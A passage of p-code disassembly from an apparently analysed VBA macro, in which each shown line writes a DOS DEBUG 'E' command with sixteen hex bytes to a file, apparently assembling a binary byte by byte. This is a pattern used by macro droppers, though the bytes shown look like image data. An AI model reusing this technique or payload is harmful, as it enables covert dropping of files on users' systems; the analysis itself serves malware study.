' 	LitStr 0x0036 "E 0D60 5B 47 4C 4F 54 57 5B 26 28 29 04 06 06 00 01 00"
' 	PrintItemNL 
' Line #409:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0D70 0E 13 11 50 56 55 5B 64 67 5B 66 6A 5B 64 68 55"
' 	PrintItemNL 
' Line #410:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0D80 5E 62 54 5D 61 53 5C 60 4F 55 5A 47 4D 52 44 4A"
' 	PrintItemNL 
' Line #411:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0D90 4F 42 48 4D 3A 3E 43 3C 40 45 38 3C 41 2F 33 38"
' 	PrintItemNL 
' Line #412:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0DA0 34 38 3D 33 38 3B 32 3A 3A 38 40 40 3B 43 43 39"
' 	PrintItemNL 
' Line #413:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0DB0 41 41 2F 37 37 00 01 01 00 00 F9 F9 F9 EE EE EE"
' 	PrintItemNL 
' Line #414:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0DC0 DA DA DA CE CE CE C8 C8 C8 BE C0 C0 00 00 01 4F"
' 	PrintItemNL 
' Line #415:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0DD0 53 54 5A 5D 61 4E 52 57 50 54 59 51 57 5E 50 56"
' 	PrintItemNL 
' Line #416:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0DE0 5D 4C 52 59 51 57 5E 62 6A 71 5E 66 6D 56 5F 63"
' 	PrintItemNL 
' Line #417:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0DF0 56 5F 63 5D 66 6A 5A 63 67 50 59 5D 51 5A 5E 5B"
' 	PrintItemNL 
' Line #418:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0E00 64 68 68 71 75 6A 73 77 5B 64 68 5C 65 69 5F 68"
' 	PrintItemNL 
' Line #419:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0E10 6C 52 5B 5F 51 5A 5E 59 62 66 54 5D 61 59 62 66"
' 	PrintItemNL 
' Line #420:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0E20 5D 66 6A 64 6D 71 6A 70 77 58 60 67 48 4F 58 47"
' 	PrintItemNL 
' Line #421:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0E30 50 59 5D 67 6E 53 5D 64 5F 67 6E 67 6B 70 4F 4E"
' 	PrintItemNL 
' Line #422:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0E40 52 15 10 12 1B 12 15 1D 12 14 18 10 11 12 0C 0D"
' 	PrintItemNL 
' Line #423:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0E50 0D 07 08 0B 05 06 0D 07 08 11 0B 0C 13 0E 0F 15"
' 	PrintItemNL 
' Line #424:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0E60 10 11 1E 19 1A 02 00 00 65 63 63 FF FF FF FF FD"
' 	PrintItemNL 
' Line #425:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0E70 FD FF FF FF FE FE FE F9 FB FC E0 E5 E8 D5 DB E0"
' 	PrintItemNL 
' Line #426:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0E80 B7 BD C2 C1 C7 CC DF E5 EA E9 ED F2 E6 EB EE D9"
' 	PrintItemNL 
' Line #427:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0E90 DC E0 E1 E2 E6 EF F1 F2 F3 F2 F4 E7 E6 E8 CD CC"
' 	PrintItemNL 
' Line #428:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0EA0 CE 39 38 3A 05 05 05 0D 0C 0E 02 00 03 12 11 15"
' 	PrintItemNL 
' Line #429:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0EB0 50 51 55 68 6D 70 5A 63 67 5B 67 6B 5B 67 6B 59"
' 	PrintItemNL 
' Line #430:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0EC0 65 69 44 4D 51 36 3C 41 49 4E 51 27 2A 2E 11 15"
' 	PrintItemNL 
' Line #431:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0ED0 16 04 06 06 02 07 06 31 37 36 5D 69 6B 5F 6B 6F"
' 	PrintItemNL 
' Line #432:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0EE0 5C 68 6C 57 63 67 56 62 66 57 63 67 51 5C 60 46"
' 	PrintItemNL 
' Line #433:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0EF0 51 55 48 53 57 44 4F 53 3B 44 48 3E 47 4B 3E 47"
' 	PrintItemNL 
' Line #434:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0F00 4B 38 41 45 3D 46 4A 3C 45 49 3F 48 4B 3A 44 44"
' 	PrintItemNL 
' Line #435:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0F10 37 41 41 3A 44 44 33 3D 3D 00 01 01 00 00 F4 F2"
' 	PrintItemNL 
' Line #436:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0F20 F1 F1 EF EE E2 E2 E2 D4 D4 D4 C2 C4 C5 B1 B3 B4"
' 	PrintItemNL 
' Line #437:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0F30 00 00 03 58 5B 5F 57 5A 5F 4B 4F 54 4C 52 59 4D"
' 	PrintItemNL 
' Line #438:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0F40 54 5D 4E 55 5E 4D 54 5D 4B 52 5B 54 5D 66 59 63"
' 	PrintItemNL 
' Line #439:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0F50 6A 59 63 6A 5A 64 6B 57 61 68 51 5B 62 4D 57 5E"
' 	PrintItemNL 
' Line #440:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0F60 50 5A 61 57 61 68 60 6A 71 64 6E 75 57 61 68 5A"
' 	PrintItemNL 
' Line #441:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0F70 64 6B 60 6A 71 50 5A 61 4C 56 5D 55 5F 66 5F 69"
' 	PrintItemNL 
' Line #442:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0F80 70 5C 66 6D 5C 66 6D 60 6A 71 5F 66 6F 52 5B 64"
' 	PrintItemNL 
' Line #443:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0F90 4C 57 5F 51 5C 64 67 72 7A 56 62 68 66 6E 75 69"
' 	PrintItemNL 
' Line #444:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0FA0 6D 72 40 3F 43 06 00 02 1C 11 14 19 0B 0F 17 0F"
' 	PrintItemNL 
' Line #445:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0FB0 10 13 0B 0C 0F 07 08 0E 06 07 0E 08 09 13 0D 0E"
' 	PrintItemNL 
' Line #446:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0FC0 16 10 11 17 12 13 0A 05 06 0E 09 0A E8 E3 E4 FF"
' 	PrintItemNL 
' Line #447:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0FD0 FC FD FA F8 F8 FC FA FA FC FA FA F8 FA FB B0 B6"
' 	PrintItemNL 
' Line #448:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0FE0 BB E1 E9 F0 D0 D8 DF BB C3 CA CF D8 DC E1 E7 EC"
' 	PrintItemNL 
' Line #449:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0FF0 E3 E7 EC D3 D8 DB DD E0 E4 ED F0 F4 EC ED F1 DB"
' 	PrintItemNL 
' Line #450:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1000 DC E0 D8 D7 D9 61 60 62 0A 07 09 0D 0A 0C 0B 05"
' 	PrintItemNL 
' Line #451:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1010 0A 06 02 08 44 44 4A 6A 6E 73 5C 66 6D 5A 66 6C"
' 	PrintItemNL 
' Line #452:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1020 52 60 66 4B 59 5F 44 50 56 35 40 44 45 4C 4F 25"
' 	PrintItemNL 
' Line #453:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1030 2A 2D 1A 1E 1F 0E 13 12 01 03 03 17 1C 1D 4F 5B"
' 	PrintItemNL 
' Line #454:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1040 5F 51 5F 65 50 5E 64 4C 5A 60 4E 5C 62 52 60 66"
' 	PrintItemNL 
' Line #455:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1050 4E 5A 60 43 4F 55 4A 56 5C 43 4F 55 38 42 49 3C"
' 	PrintItemNL 
' Line #456:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1060 46 4D 40 4A 51 3C 46 4D 41 4B 52 3E 49 4D 3B 47"
' 	PrintItemNL 
' Line #457:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1070 49 35 41 41 33 3F 3F 3C 48 48 31 3D 3D 00 01 01"
' 	PrintItemNL 
' Line #458:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1080 00 00 FD FB FA EC ED EB D8 D8 D8 CC CE CE C5 C7"
' 	PrintItemNL 
' Line #459:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1090 C8 B2 B6 B7 05 08 0C 52 57 5A 54 58 5D 49 4F 54"
' 	PrintItemNL 
' Line #460:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 10A0 4C 54 5B 4D 54 5D 50 57 60 52 59 62 48 51 5B 4B"
' 	PrintItemNL 
' Line #461:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 10B0 54 5D 5D 66 6F 66 70 77 67 71 78 5C 66 6D 51 5B"
' 	PrintItemNL 
' Line #462:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 10C0 62 4E 58 5F 4D 57 5E 4B 55 5C 60 6A 71 67 71 78"
' 	PrintItemNL 
' Line #463:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 10D0 5D 67 6E 65 6F 76 6D 77 7E 5C 66 6D 58 62 69 61"
' 	PrintItemNL 
' Line #464:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 10E0 6B 72 5C 66 6D 58 62 69 63 6D 74 6D 77 7E 63 6C"
' 	PrintItemNL 
' Line #465:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 10F0 75 53 5E 66 4B 58 60 46 56 5D 53 63 6A 52 60 66"
' 	PrintItemNL 
' Line #466:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1100 5F 69 70 5D 63 68 40 3F 43 05 00 01 1D 0F 13 21"
' 	PrintItemNL 
' Line #467:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1110 13 15 18 0D 0F 12 0A 0B 0F 07 08 0F 07 08 10 0A"
' 	PrintItemNL 
' Line #468:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1120 0B 13 0E 0F 16 12 11 18 13 14 09 04 05 85 80 82"
' 	PrintItemNL 
' Line #469:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1130 FF FD FF FF FC FF FF FE FF FF FE FF FD FC FF DA"
' 	PrintItemNL 
' Line #470:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1140 DD E5 68 70 7D DD E6 F3 F1 F6 FF C8 CB D3 CA CE"
' 	PrintItemNL 
' Line #471:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1150 D3 DA DE E3 DE E2 E7 D0 D4 D9 DC DF E3 EF F2 F6"
' 	PrintItemNL 
' Line #472:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1160 F0 F1 F5 DC DD E1 DE DD DF 73 72 74 04 01 03 0D"
' 	PrintItemNL 
' Line #473:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1170 08 0A 0F 09 0E 02 0F 13 3A 3A 40 68 6C 71 5B 63"
' 	PrintItemNL 
' Line #474:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1180 6A 57 63 69 51 5F 65 4A 58 5E 46 54 5A 40 4C 50"
' 	PrintItemNL 
' Line #475:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1190 4D 56 5A 28 2F 32 1A 1F 20 0E 12 13 00 00 00 07"
' 	PrintItemNL 
' Line #476:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 11A0 0B 0C 4B 57 59 4D 5C 5F 4E 5D 60 4C 5B 5E 51 60"
' 	PrintItemNL 
' Line #477:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 11B0 63 58 66 6C 53 61 67 48 56 5C 52 60 66 48 56 5C"
' 	PrintItemNL 
' Line #478:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 11C0 3A 46 4C 3B 47 4D 3C 48 4E 37 41 48 39 43 4A 36"
' 	PrintItemNL 
' Line #479:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 11D0 3F 43 3E 47 4A 3A 44 44 35 3F 3F 3C 46 46 2C 36"
' 	PrintItemNL 
' Line #480:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 11E0 36 00 01 01 00 00 F7 F8 F6 EA ED EB DD DF DF CE"
' 	PrintItemNL 
' Line #481:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 11F0 D0 D0 C2 C4 C5 B7 BB BC 00 00 03 55 5A 5D 56 5A"
' 	PrintItemNL 
' Line #482:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1200 5F 51 57 5C 59 61 68 60 68 6F 52 5B 64 49 52 5B"
' 	PrintItemNL 
' Line #483:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1210 4F 58 61 55 5E 67 53 5C 65 58 61 6A 6C 75 7E 62"
' 	PrintItemNL 
' Line #484:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1220 6B 74 5B 64 6D 5D 66 6F 50 59 62 58 61 6A 67 70"
' 	PrintItemNL 
' Line #485:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1230 79 6A 73 7C 74 7D 86 60 69 72 5C 65 6E 68 71 7A"
' 	PrintItemNL 
' Line #486:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1240 44 95 98 25 CC C9 59 70 78 5C 65 6E 5C 65 6E 63"
' 	PrintItemNL 
' Line #487:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1250 6C 75 64 6E 78 53 5F 69 4F 61 68 63 75 7C 59 6D"
' 	PrintItemNL 
' Line #488:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1260 72 59 6C 71 63 72 75 6D 74 77 2A 29 2B 0F 07 08"
' 	PrintItemNL 
' Line #489:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1270 15 96 92 1B 4B 49 20 14 14 14 0A 0A 09 00 03 12"
' 	PrintItemNL 
' Line #490:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1280 0B 0E 04 00 00 15 13 12 12 13 0F 00 01 00 11 0C"
' 	PrintItemNL 
' Line #491:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1290 0E F7 F0 F5 FF FC FF FF F9 FF FF FD FF FF FD FF"
' 	PrintItemNL 
' Line #492:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 12A0 F4 F6 FF C1 C8 D9 17 1F 3C E2 E9 FF AB F6 FA 50"
' 	PrintItemNL 
' Line #493:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 12B0 F3 F0 62 E7 E6 8C E5 E7 CD E0 E4 D0 D5 D8 DE E2"
' 	PrintItemNL 
' Line #494:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 12C0 E3 E8 EC ED E9 E9 EF EB EB F1 DF E1 E2 9C 9C 9C"
' 	PrintItemNL 
' Line #495:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 12D0 04 00 01 10 09 0C 0E 08 0D 09 BB B6 18 17 1B 69"
' 	PrintItemNL 
' Line #496:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 12E0 6C 70 6B 71 76 54 5F 63 4F 5D 63 56 64 6A 50 5E"
' 	PrintItemNL 
' Line #497:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 12F0 64 3F 4B 4F 48 53 57 3C 45 48 1B 20 21 23 25 26"
' 	PrintItemNL 
' Line #498:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1300 00 00 00 00 00 00 35 3D 3C 54 5F 5D 51 5D 5D 3F"
' 	PrintItemNL 
' Line #499:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1310 59 59 32 94 92 2D AA A8 1D C5 C1 19 CF CA 19 CF"
' 	PrintItemNL 
' Line #500:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1320 CA 22 AE AC 2C 8C 8D 40 59 5F 40 4B 4F 3A 43 47"
' 	PrintItemNL 
' Line #501:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1330 36 3F 43 38 3F 42 3F 44 45 42 47 48 3B 40 41 3A"
' 	PrintItemNL 
' Line #502:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1340 3F 40 33 38 39 00 00 01 00 00 F4 F7 F5 EB EE EC"
' 	PrintItemNL 
' Line #503:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1350 DE E0 E0 CE D0 D0 BF C3 C4 B6 BA BB 00 00 03 58"
' 	PrintItemNL 
' Line #504:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1360 5D 60 50 56 5B 54 5A 5F 5A 62 69 57 5F 66 4C 55"
' 	PrintItemNL 
' Line #505:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1370 5E 4F 58 61 57 60 69 57 60 69 55 5E 67 58 61 6A"
' 	PrintItemNL 
' Line #506:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1380 69 72 7B 63 6C 75 5D 66 6F 59 62 6B 4D 56 5F 5B"
' 	PrintItemNL 
' Line #507:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1390 64 6D 5E 67 70 5D 66 6F 66 6F 78 5A 63 6C 5A 63"
' 	PrintItemNL 
' Line #508:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 13A0 6C 4F 91 96 09 F7 EF 09 F7 EF 2F B9 B9 5D 66 6F"
' 	PrintItemNL 
' Line #509:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 13B0 5C 65 6E 5D 68 70 59 63 6D 4B 5A 63 4C 5E 65 5A"
' 	PrintItemNL 
' Line #510:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 13C0 6D 74 5D 73 78 5B 70 72 61 70 73 62 6C 6C 22 21"
' 	PrintItemNL 
' Line #511:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 13D0 23 0C 04 05 09 F7 EF 15 84 81 16 0A 08 1E 14 14"
' 	PrintItemNL 
' Line #512:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 13E0 15 09 0F 0E 07 0C 11 0C 0D 0A 08 07 1A 1B 17 01"
' 	PrintItemNL 
' Line #513:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 13F0 02 00 9A 97 99 FF FD FF FF F9 FF FF F8 FF FF FC"
' 	PrintItemNL 
' Line #514:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1400 FF FD FC FF F5 FA FF 9F A9 C1 10 19 3E 8C DB F0"
' 	PrintItemNL 
' Line #515:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1410 09 F7 EF 09 F7 EF 09 F7 EF 09 F7 EF 15 F6 EE 6B"
' 	PrintItemNL 
' Line #516:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1420 E5 E3 E0 E4 E5 EA EE EF EC EC F2 EA EA F0 E6 E8"
' 	PrintItemNL 
' Line #517:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1430 E9 A9 A8 AA 06 00 02 0E 07 0A 0E 35 38 09 F7 EF"
' 	PrintItemNL 
' Line #518:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1440 08 7F 7D 54 57 5B 61 67 6C 53 5E 62 59 65 6B 60"
' 	PrintItemNL 
' Line #519:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1450 6E 74 4C 5A 60 41 50 53 39 44 48 37 40 43 1E 23"
' 	PrintItemNL 
' Line #520:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1460 24 1B 1D 1E 16 16 16 00 00 00 1E 25 22 4E 57 54"
' 	PrintItemNL 
' Line #521:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1470 44 7A 77 0D EE E6 09 F7 EF 09 F7 EF 09 F7 EF 09"
' 	PrintItemNL 
' Line #522:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1480 F7 EF 09 F7 EF 09 F7 EF 09 F7 EF 09 F7 EF 19 C0"
' 	PrintItemNL 
' Line #523:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1490 BC 27 86 86 35 4A 4D 37 3E 41 3E 43 44 42 46 47"
' 	PrintItemNL 
' Line #524:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 14A0 42 46 47 40 44 45 38 3C 3D 00 03 04 00 00 F4 F7"
' 	PrintItemNL 
' Line #525:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 14B0 F5 EC EF ED DF E1 E1 CF D1 D1 BE C2 C3 B6 BA BB"
' 	PrintItemNL 
' Line #526:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 14C0 00 02 05 5C 61 64 58 5E 63 54 5A 5F 51 59 60 50"
' 	PrintItemNL 
' Line #527:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 14D0 58 5F 4A 53 5C 4D 56 5F 52 5B 64 52 5B 64 55 7B"
' 	PrintItemNL 
' Line #528:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 14E0 81 41 92 96 60 69 72 5C 65 6E 57 60 69 4F 58 61"
' 	PrintItemNL 
' Line #529:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 14F0 4E 57 60 6A 73 7C 66 6F 78 5E 67 70 65 6E 77 60"
' 	PrintItemNL 
' Line #530:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1500 69 72 63 6C 75 28 CF CC 09 F7 EF 09 F7 EF 09 F7"
' 	PrintItemNL 
' Line #531:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1510 EF 55 7B 82 5E 67 70 5D 68 70 59 63 6D 56 65 6E"
' 	PrintItemNL 
' Line #532:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1520 59 6B 72 59 6C 73 62 76 7B 5C 6F 72 5E 6A 6E 56"
' 	PrintItemNL 
' Line #533:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1530 5E 5E 18 17 19 0C 04 05 09 F7 EF 16 86 82 1B 0E"
' 	PrintItemNL 
' Line #534:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1540 0C 0D 03 03 0A 00 02 0B 01 07 14 0E 0F 14 12 11"
' 	PrintItemNL 
' Line #535:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1550 02 03 01 11 12 10 FB F8 FA FF FD FF FE F4 FA FF"
' 	PrintItemNL 
' Line #536:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1560 FC FF FF F9 FF FB FC FF F3 F9 FF 73 7E 9A 1C 26"
' 	PrintItemNL 
' Line #537:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1570 4E 1C EE EC 09 F7 EF 09 F7 EF 09 F7 EF 09 F7 EF"
' 	PrintItemNL 
' Line #538:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1580 09 F7 EF 09 F7 EF 3E F2 ED DC EE F1 EF EE F7 E7"
' 	PrintItemNL 
' Line #539:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1590 E6 EF ED EE F2 BD BC C0 0B 05 0A 0A 03 08 0D 91"
' 	PrintItemNL 
' Line #540:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 15A0 8D 09 F7 EF 07 BA B5 46 49 4D 63 69 6E 54 5F 63"
' 	PrintItemNL 
' Line #541:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 15B0 52 5E 64 52 60 66 4F 5D 63 49 58 5B 2A 43 47 21"
' 	PrintItemNL 
' Line #542:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 15C0 8E 8C 32 37 38 1E 20 21 2C 2C 2C 00 00 00 01 08"
' 	PrintItemNL 
' Line #543:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 15D0 05 3F 48 45 23 BD B7 09 F7 EF 09 F7 EF 09 F7 EF"
' 	PrintItemNL 
' Line #544:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 15E0 09 F7 EF 09 F7 EF 09 F7 EF 09 F7 EF 09 F7 EF 09"
' 	PrintItemNL 
' Line #545:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 15F0 F7 EF 09 F7 EF 09 F7 EF 0B EC E4 17 AF AB 33 55"
' 	PrintItemNL 
' Line #546:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1600 55 3C 41 42 44 49 4A 41 46 47 38 3D 3E 00 03 04"
